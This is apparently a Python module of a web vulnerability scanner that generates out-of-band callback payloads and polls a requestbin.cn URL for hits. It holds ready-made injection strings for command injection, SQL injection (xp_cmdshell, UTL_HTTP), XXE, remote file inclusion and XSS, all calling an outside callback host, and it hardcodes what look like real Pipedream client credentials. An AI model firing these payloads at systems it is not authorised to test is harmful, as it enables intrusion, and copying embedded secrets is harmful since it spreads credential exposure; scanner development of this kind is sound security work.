"""
Out-of-Band (OOB) Detection Utility

Provides callback-based detection for blind vulnerabilities:
- Generates unique callback URLs for each test
- Checks callback service for received requests
- Supports requestbin.cn and pipedream
"""

import time
import uuid
import requests
from typing import Dict, List, Tuple, Optional
from core.logger import get_logger

logger = get_logger(__name__)


class OOBDetector:
    """Out-of-Band vulnerability detector using callback services"""

    # Default callback configuration
    DEFAULT_REQUESTBIN_URL = "http://requestbin.cn/15y70i81"
    DEFAULT_PIPEDREAM_CLIENT_ID = "j1XIbDfgEA8ihGUfQ5xALdY9fVSFQdaNP1HGMAUnnSc"
    DEFAULT_PIPEDREAM_CLIENT_SECRET = "P4V40oQRWBFeKPSC8HIuJUn45KHnu784wzlmeaeXy8s"

    def __init__(self, callback_url: Optional[str] = None,
                 pipedream_client_id: Optional[str] = None,
                 pipedream_client_secret: Optional[str] = None):
        """
        Initialize OOB detector

        Args:
            callback_url: Base callback URL (requestbin.cn)
            pipedream_client_id: Pipedream client ID
            pipedream_client_secret: Pipedream client secret
        """
        self.callback_url = callback_url or self.DEFAULT_REQUESTBIN_URL
        self.pipedream_client_id = pipedream_client_id or self.DEFAULT_PIPEDREAM_CLIENT_ID
        self.pipedream_client_secret = pipedream_client_secret or self.DEFAULT_PIPEDREAM_CLIENT_SECRET

        # Parse callback URL
        self.callback_base = self.callback_url.replace('http://', '').replace('https://', '').split('/')[0]
        self.callback_path = '/' + '/'.join(self.callback_url.replace('http://', '').replace('https://', '').split('/')[1:])

        # Track sent payloads
        self.sent_payloads: Dict[str, Dict] = {}

    def generate_callback_id(self, vuln_type: str) -> str:
        """
        Generate unique callback ID

        Args:
            vuln_type: Type of vulnerability (ssrf, rce, sqli, xss, xxe, rfi)

        Returns:
            Unique callback ID
        """
        unique_id = str(uuid.uuid4())[:8]
        callback_id = f"{vuln_type}_{unique_id}"
        return callback_id

    def get_callback_payloads(self, vuln_type: str, target_url: str, param: str) -> List[Dict[str, str]]:
        """
        Generate OOB payloads for specific vulnerability type

        Args:
            vuln_type: Type of vulnerability (ssrf, rce, sqli, xss, xxe, rfi, cmdi)
            target_url: Target URL being tested
            param: Parameter being tested

        Returns:
            List of payload dictionaries with callback URLs
        """
        callback_id = self.generate_callback_id(vuln_type)
        callback_path = f"{self.callback_path}/{callback_id}"

        # Store payload metadata for verification
        self.sent_payloads[callback_id] = {
            'vuln_type': vuln_type,
            'target_url': target_url,
            'param': param,
            'timestamp': time.time()
        }

        payloads = []

        if vuln_type == 'ssrf':
            payloads = [
                {'payload': f"http://{self.callback_base}{callback_path}", 'type': 'http'},
                {'payload': f"https://{self.callback_base}{callback_path}", 'type': 'https'},
                {'payload': f"//{self.callback_base}{callback_path}", 'type': 'protocol-relative'},
                {'payload': f"@{self.callback_base}{callback_path}", 'type': 'url-bypass'},
            ]

        elif vuln_type in ['rce', 'cmdi']:
            payloads = [
                {'payload': f"curl http://{self.callback_base}{callback_path}", 'type': 'curl'},
                {'payload': f"wget http://{self.callback_base}{callback_path}", 'type': 'wget'},
                {'payload': f"ping -c 1 {self.callback_base}", 'type': 'ping'},
                {'payload': f"nslookup {self.callback_base}", 'type': 'nslookup'},
                {'payload': f"`curl http://{self.callback_base}{callback_path}`", 'type': 'backtick'},
                {'payload': f"$(curl http://{self.callback_base}{callback_path})", 'type': 'command-substitution'},
                {'payload': f";curl http://{self.callback_base}{callback_path};", 'type': 'semicolon'},
                {'payload': f"|curl http://{self.callback_base}{callback_path}|", 'type': 'pipe'},
                {'payload': f"&curl http://{self.callback_base}{callback_path}&", 'type': 'ampersand'},
            ]

        elif vuln_type == 'sqli':
            payloads = [
                {'payload': f"'; EXEC master..xp_dirtree '\\\\{self.callback_base}{callback_path}' --", 'type': 'mssql-xp_dirtree'},
                {'payload': f"' AND 1=UTL_HTTP.REQUEST('http://{self.callback_base}{callback_path}') --", 'type': 'oracle-utl_http'},
                {'payload': f"' UNION SELECT LOAD_FILE('\\\\\\\\{self.callback_base}{callback_path}') --", 'type': 'mysql-load_file'},
                {'payload': f"' OR 1=1; EXEC xp_cmdshell 'curl http://{self.callback_base}{callback_path}' --", 'type': 'mssql-xp_cmdshell'},
            ]

        elif vuln_type == 'xxe':
            payloads = [
                {'payload': f"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://{self.callback_base}{callback_path}'>]><root>&test;</root>", 'type': 'xxe-entity'},
                {'payload': f"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://{self.callback_base}{callback_path}\"> %xxe;]>", 'type': 'xxe-parameter'},
                {'payload': f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{self.callback_base}{callback_path}\">]><foo>&xxe;</foo>", 'type': 'xxe-simple'},
            ]

        elif vuln_type == 'rfi':
            payloads = [
                {'payload': f"http://{self.callback_base}{callback_path}.php", 'type': 'php'},
                {'payload': f"http://{self.callback_base}{callback_path}.txt", 'type': 'txt'},
                {'payload': f"//{self.callback_base}{callback_path}.php", 'type': 'protocol-relative'},
            ]

        elif vuln_type == 'xss':
            payloads = [
                {'payload': f"<script src=\"http://{self.callback_base}{callback_path}.js\"></script>", 'type': 'script-src'},
                {'payload': f"<img src=\"http://{self.callback_base}{callback_path}.gif\">", 'type': 'img-src'},
                {'payload': f"<iframe src=\"http://{self.callback_base}{callback_path}\"></iframe>", 'type': 'iframe'},
                {'payload': f"<svg onload=\"fetch('http://{self.callback_base}{callback_path}')\">", 'type': 'svg-onload'},
                {'payload': f"\"><script>fetch('http://{self.callback_base}{callback_path}')</script>", 'type': 'script-fetch'},
            ]

        # Add callback_id to all payloads
        for p in payloads:
            p['callback_id'] = callback_id

        return payloads

    def check_callback(self, callback_id: str, wait_time: int = 3) -> Tuple[bool, Optional[str]]:
        """
        Check if callback was received

        Args:
            callback_id: Unique callback ID to check
            wait_time: Time to wait before checking (seconds)

        Returns:
            Tuple of (detected, evidence)
        """
        # Wait for callback to arrive
        time.sleep(wait_time)

        try:
            # Check requestbin.cn for callback
            check_url = f"{self.callback_url}?inspect"

            response = requests.get(check_url, timeout=10)

            if response.status_code == 200:
                response_text = response.text.lower()

                # Check if our callback_id appears in the response
                if callback_id.lower() in response_text:
                    logger.info(f"✓ OOB callback received: {callback_id}")

                    # Extract evidence
                    evidence = self._extract_callback_evidence(response_text, callback_id)
                    return True, evidence

        except Exception as e:
            logger.debug(f"Error checking callback: {e}")

        return False, None

    def _extract_callback_evidence(self, response_text: str, callback_id: str) -> str:
        """
        Extract callback evidence from response

        Args:
            response_text: Response text from callback service
            callback_id: Callback ID

        Returns:
            Evidence string
        """
        # Look for the callback_id in context
        response_lower = response_text.lower()
        callback_lower = callback_id.lower()

        idx = response_lower.find(callback_lower)
        if idx == -1:
            return f"Callback ID '{callback_id}' found in response"

        # Extract 100 chars before and 50 after
        start = max(0, idx - 100)
        end = min(len(response_text), idx + len(callback_id) + 50)

        context = response_text[start:end]

        # Clean up HTML tags if present
        import re
        context = re.sub(r'<[^>]+>', ' ', context)
        context = re.sub(r'\s+', ' ', context).strip()

        return f"Callback received: ...{context}..."

    def get_payload_metadata(self, callback_id: str) -> Optional[Dict]:
        """
        Get metadata for a sent payload

        Args:
            callback_id: Callback ID

        Returns:
            Payload metadata dictionary
        """
        return self.sent_payloads.get(callback_id)
